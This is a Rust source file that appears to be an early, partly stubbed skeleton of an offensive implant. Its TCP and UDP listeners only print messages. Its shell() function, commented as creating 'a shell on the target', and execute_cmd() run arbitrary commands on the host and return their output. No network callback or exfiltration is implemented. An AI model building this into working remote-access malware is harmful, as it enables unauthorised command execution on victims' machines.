use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener};



//pub struct info {
//  arch: String,
//  os: String,
//  hostname: String,
//}

pub struct Listener {
    udp_sock: UdpSocket,
    tcp_sock: TcpListener,
    id: u64,
    status: u8,
    port: u64,
}

pub trait Listen {
    fn run(&self, protocol: &str, address: SocketAddr);
    fn listen_udp(&self, address: SocketAddr);
    fn listen_tcp(&self, address: SocketAddr);
    // fn parse_tcp();
    // fn parse_udp();
    // fn parse_http();
    // fn parse_dns();
}


impl Listen for Listener {
    fn run(&self, protocol: &str, address: SocketAddr){
        match protocol {
            "udp" => self.listen_udp(address),
            "tcp" => self.listen_tcp(address),
            "http" => self.listen_tcp(address),
            "dns" => self.listen_udp(address),
            &_ => todo!(),
        }
    }

    fn listen_tcp(&self, address: SocketAddr){
        println!("[+] Opening tcp listener on port {}", self.port);
    }

    fn listen_udp(&self, address: SocketAddr){
        println!("[+] Opening udp listener on port {}", self.port);
    }

}

// pub struct Sender



// creates a shell on the target
pub fn shell() {
    if let Ok(command) = Command::new("/bin/sh").output(){
        println!("{}", String::from_utf8_lossy(&command.stdout));
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.contains(' ') {
        let mut split = s.split_whitespace();
        let head = split.next().unwrap();
        let tail: Vec<&str> = split.collect();
        let cmd = Command::new(head).args(tail).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
    else {
        let cmd = Command::new(s).output().unwrap();
        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
    }
}
